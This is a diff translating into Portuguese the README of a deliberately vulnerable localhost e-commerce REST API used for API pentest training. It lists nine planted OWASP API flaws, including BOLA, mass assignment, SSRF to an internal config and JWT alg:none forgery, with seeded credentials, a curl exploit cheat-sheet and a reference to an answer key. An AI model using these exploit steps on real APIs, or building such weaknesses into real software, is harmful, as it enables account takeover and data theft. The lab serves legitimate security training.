@@ -1,50 +1,50 @@
-# 04 - ShopAPI (deliberately vulnerable JSON REST API)
+# 04 - ShopAPI (API REST JSON vulnerável de propósito)
 
-> ⚠️ **INTENTIONALLY VULNERABLE — LOCALHOST ONLY.** This service ships nine real
-> bugs from the OWASP API Security Top 10. Never expose it to a network. It binds
-> `127.0.0.1:18804` on purpose.
+> ⚠️ **VULNERÁVEL DE PROPÓSITO — SOMENTE LOCALHOST.** Este serviço traz nove bugs
+> reais do OWASP API Security Top 10. Nunca o exponha a uma rede. Ele escuta em
+> `127.0.0.1:18804` de propósito.
 
-**ShopAPI** is a fake e-commerce REST API used as an API-pentest training target.
-It is a single, stdlib-only Python file (`http.server` + `sqlite3` +
-`hmac`/`hashlib`/`base64` + `json`). There are **no external dependencies** and
-JWTs are built and verified **by hand** (no PyJWT). Data lives in a seeded
-in-memory SQLite database.
+O **ShopAPI** é uma API REST de comércio eletrônico falsa, usada como alvo de
+treino de pentest de API. É um arquivo Python único, só com a biblioteca padrão
+(`http.server` + `sqlite3` + `hmac`/`hashlib`/`base64` + `json`). Não há
+**nenhuma dependência externa** e os JWTs são montados e verificados **na mão**
+(sem PyJWT). Os dados ficam num banco SQLite em memória, populado do zero.
 
-## Run
+## Rodar
 
 ```bash
 python app.py
-# -> ShopAPI (vulnerable API lab) on http://127.0.0.1:18804
+# -> ShopAPI (lab de API vulnerável) em http://127.0.0.1:18804
 ```
 
-All responses are JSON (`Content-Type: application/json`). The server is
-threaded, never crashes, and reuses the address. `GET /` or `GET /api/v1/`
-returns a discoverable index of every endpoint.
+Todas as respostas são JSON (`Content-Type: application/json`). O servidor é
+multithread, nunca trava e reaproveita o endereço. `GET /` ou `GET /api/v1/`
+devolve um índice descobrível de todos os endpoints.
 
-## Auth model
+## Modelo de autenticação
 
-- `POST /api/v1/login` with `{"username","password"}` returns `{"token": "<jwt>"}`.
-- Protected endpoints read `Authorization: Bearer <jwt>`.
-- Tokens carry `{"sub": <username>, "role": <role>}`.
-- The JWT verifier is **deliberately broken** (see B8): it accepts `alg:none`
-  unsigned tokens, verifies `HS256` against the weak secret `apisecret`, and
-  never checks expiry.
+- `POST /api/v1/login` com `{"username","password"}` devolve `{"token": "<jwt>"}`.
+- Endpoints protegidos leem `Authorization: Bearer <jwt>`.
+- Os tokens carregam `{"sub": <username>, "role": <role>}`.
+- O verificador de JWT é **quebrado de propósito** (veja B8): aceita tokens não
+  assinados `alg:none`, verifica `HS256` contra o segredo fraco `apisecret` e
+  nunca confere a validade.
 
-## Seeded users
+## Usuários de semente
 
-Passwords are stored as **MD5** (weak by design). Plaintext is shown here only
-because this is a lab.
+As senhas são armazenadas como **MD5** (fraco por projeto). O texto plano é
+mostrado aqui só porque isto é um laboratório.
 
-| id | username | password (plain) | md5(password)                      | role  | email               | ssn         |
+| id | username | password (plano) | md5(password)                      | role  | email               | ssn         |
 |----|----------|------------------|------------------------------------|-------|---------------------|-------------|
 | 1  | admin    | `admin123`       | `0192023a7bbd73250516f069df18b500` | admin | admin@shopapi.test  | 111-22-3333 |
 | 2  | alice    | `alicepass`      | `7c90f2dc82aa5dd4501132f6d074a53a` | user  | alice@example.com   | 222-33-4444 |
 | 3  | bob      | `bobsecret`      | `de3d9451c238b5949ad3597a6a682628` | user  | bob@example.com     | 333-44-5555 |
 | 4  | carol    | `carol2024`      | `8c3f57612a56df09ee89dfef094c6aef` | user  | carol@example.com   | 444-55-6666 |
 
-`admin/admin123` is the admin account. MD5 is used on purpose (weak hashing).
+`admin/admin123` é a conta de administrador. O MD5 é usado de propósito (hash fraco).
 
-Orders (table `orders`: `id, user_id, item, total`):
+Pedidos (tabela `orders`: `id, user_id, item, total`):
 
 | id   | user_id | item                  | total   |
 |------|---------|-----------------------|---------|
@@ -54,51 +54,51 @@ Orders (table `orders`: `id, user_id, item, total`):
 | 1004 | 3 (bob)   | Mechanical keyboard  | 109.00  |
 | 1005 | 4 (carol) | 4K monitor           | 349.99  |
 
-## Planted vulnerabilities (B1..B9)
+## Vulnerabilidades plantadas (B1..B9)
 
-| ID  | OWASP API category                                | Route                          | How to exploit |
+| ID  | Categoria OWASP API                               | Rota                           | Como explorar |
 |-----|---------------------------------------------------|--------------------------------|----------------|
-| B1  | API1:2023 Broken Object Level Auth (BOLA)         | `GET /api/v1/orders/<id>`      | Log in as `alice`; request `orders/1001` (admin's order) or `orders/1004` (bob's). Token is valid but ownership is never checked → any order id leaks. |
-| B2  | API1:2023 BOLA (PII)                               | `GET /api/v1/users/<id>`       | With any valid token, request `users/1`, `users/3`, … No ownership check → read any user's full record (email, address, ssn, internal_notes). |
-| B3  | API5:2023 Broken Function Level Auth (BFLA)        | `POST /api/v1/admin/promote`   | With a **normal-user** token, `POST {"username":"alice","role":"admin"}`. The "admin" function never verifies the caller's role → self-promotion. |
-| B4  | API3:2023 Broken Object Property Level / Mass Assign | `PATCH /api/v1/me`          | As `alice`, `PATCH {"role":"admin"}` (or `{"is_admin":true}`). No allow-list → arbitrary fields incl. `role` are written to your own record. |
-| B5  | API3:2023 Excessive Data Exposure                 | `GET /api/v1/users`            | With any valid token, list users. The response includes `password_hash` (md5), `ssn`, and `internal_notes` — fields a client must never receive. |
-| B6  | API4:2023 Unrestricted Resource Consumption (no rate limit) | `POST /api/v1/login` | Brute-force credentials: there is no counter, delay, or lockout. Hammer `login` with a wordlist; every attempt is processed instantly. |
-| B7  | API7:2023 Server Side Request Forgery (SSRF)      | `POST /api/v1/avatar`          | `POST {"url":"http://127.0.0.1:18804/api/v1/internal/config"}`. The server fetches the URL with no destination validation and reflects the body → leaks internal config (db DSN, stripe key, aws keys, flag). |
-| B8  | API2:2023 Broken Authentication (JWT)             | all protected routes           | (a) Forge `{"alg":"none"}` header + `{"sub":"admin","role":"admin"}` payload, empty signature → accepted by `GET /api/v1/me`. (b) The HS256 secret is `apisecret` (guessable/brute-forceable), so you can mint valid signed tokens too. (c) `exp` is never validated. |
-| B9  | API8:2023 Security Misconfiguration (verbose error)| `POST /api/v1/orders`         | `POST` malformed JSON (e.g. `{bad json`) or `{"item": 123}` (non-string). The full Python traceback is returned in the response body instead of a generic error. |
+| B1  | API1:2023 Broken Object Level Auth (BOLA)         | `GET /api/v1/orders/<id>`      | Entre como `alice`; peça `orders/1001` (pedido do admin) ou `orders/1004` (do bob). O token é válido mas a propriedade nunca é verificada → qualquer id de pedido vaza. |
+| B2  | API1:2023 BOLA (PII)                               | `GET /api/v1/users/<id>`       | Com qualquer token válido, peça `users/1`, `users/3`, … Sem verificação de propriedade → leia o registro completo de qualquer usuário (email, endereço, ssn, internal_notes). |
+| B3  | API5:2023 Broken Function Level Auth (BFLA)        | `POST /api/v1/admin/promote`   | Com token de **usuário comum**, `POST {"username":"alice","role":"admin"}`. A função "admin" nunca verifica o papel de quem chama → autopromoção. |
+| B4  | API3:2023 Broken Object Property Level / Mass Assign | `PATCH /api/v1/me`          | Como `alice`, `PATCH {"role":"admin"}` (ou `{"is_admin":true}`). Sem lista de permissão → campos arbitrários, inclusive `role`, são gravados no seu próprio registro. |
+| B5  | API3:2023 Excessive Data Exposure                 | `GET /api/v1/users`            | Com qualquer token válido, liste usuários. A resposta inclui `password_hash` (md5), `ssn` e `internal_notes` — campos que um cliente nunca deveria receber. |
+| B6  | API4:2023 Unrestricted Resource Consumption (sem limite de taxa) | `POST /api/v1/login` | Força bruta de credenciais: não há contador, atraso nem bloqueio. Martele o `login` com uma wordlist; toda tentativa é processada na hora. |
+| B7  | API7:2023 Server Side Request Forgery (SSRF)      | `POST /api/v1/avatar`          | `POST {"url":"http://127.0.0.1:18804/api/v1/internal/config"}`. O servidor busca a URL sem validar o destino e reflete o corpo → vaza a configuração interna (DSN do banco, chave stripe, chaves aws, flag). |
+| B8  | API2:2023 Broken Authentication (JWT)             | todas as rotas protegidas      | (a) Forje o cabeçalho `{"alg":"none"}` + payload `{"sub":"admin","role":"admin"}`, assinatura vazia → aceito por `GET /api/v1/me`. (b) O segredo HS256 é `apisecret` (adivinhável/força-brutável), então também dá para cunhar tokens assinados válidos. (c) O `exp` nunca é validado. |
+| B9  | API8:2023 Security Misconfiguration (erro verboso)| `POST /api/v1/orders`         | `POST` de JSON malformado (por exemplo `{bad json`) ou `{"item": 123}` (não string). O traceback completo do Python é devolvido no corpo em vez de um erro genérico. |
 
-### The SSRF target
+### O alvo do SSRF
 
-`GET /api/v1/internal/config` returns fake internal secrets but **refuses
-non-loopback callers** (returns 403 unless the request comes from `127.0.0.1` /
-`::1`). It is reachable through the SSRF in `POST /api/v1/avatar` (B7), which
-fetches it *from the server itself*.
+`GET /api/v1/internal/config` devolve segredos internos falsos mas **recusa
+chamadores fora do loopback** (devolve 403 a menos que a requisição venha de
+`127.0.0.1` / `::1`). É alcançável pelo SSRF em `POST /api/v1/avatar` (B7), que o
+busca *a partir do próprio servidor*.
 
-## Quick start (exploit cheat-sheet)
+## Início rápido (cola de exploração)
 
 ```bash
 BASE=http://127.0.0.1:18804
 
-# get a normal-user token
+# pega um token de usuário comum
 TOK=$(curl -s $BASE/api/v1/login -d '{"username":"alice","password":"alicepass"}' \
       | python -c "import sys,json;print(json.load(sys.stdin)['token'])")
 
-# B1: cross-user order
+# B1: pedido de outro usuário
 curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/orders/1001
 
-# B5: excessive data exposure
+# B5: exposição excessiva de dados
 curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/users
 
-# B3: self-promote via admin function
+# B3: autopromoção pela função admin
 curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/admin/promote \
      -d '{"username":"alice","role":"admin"}'
 
-# B4: mass assignment
+# B4: atribuição em massa
 curl -s -X PATCH -H "Authorization: Bearer $TOK" $BASE/api/v1/me \
      -d '{"role":"admin"}'
 
-# B7: SSRF to internal config
+# B7: SSRF para a config interna
 curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/avatar \
      -d '{"url":"http://127.0.0.1:18804/api/v1/internal/config"}'
 
@@ -106,8 +106,8 @@ curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/avatar \
 curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/orders -d '{bad json'
 ```
 
-For an `alg:none` forgery (B8), base64url-encode `{"alg":"none","typ":"JWT"}` and
-`{"sub":"admin","role":"admin"}`, join with a trailing dot, and send it as the
-Bearer token — no signature required.
+Para uma forja `alg:none` (B8), codifique em base64url `{"alg":"none","typ":"JWT"}`
+e `{"sub":"admin","role":"admin"}`, junte com um ponto ao final e envie como token
+Bearer — sem assinatura.
 
-See `gabarito.json` for the machine-readable answer key.
+Veja `gabarito.json` para o gabarito legível por máquina.
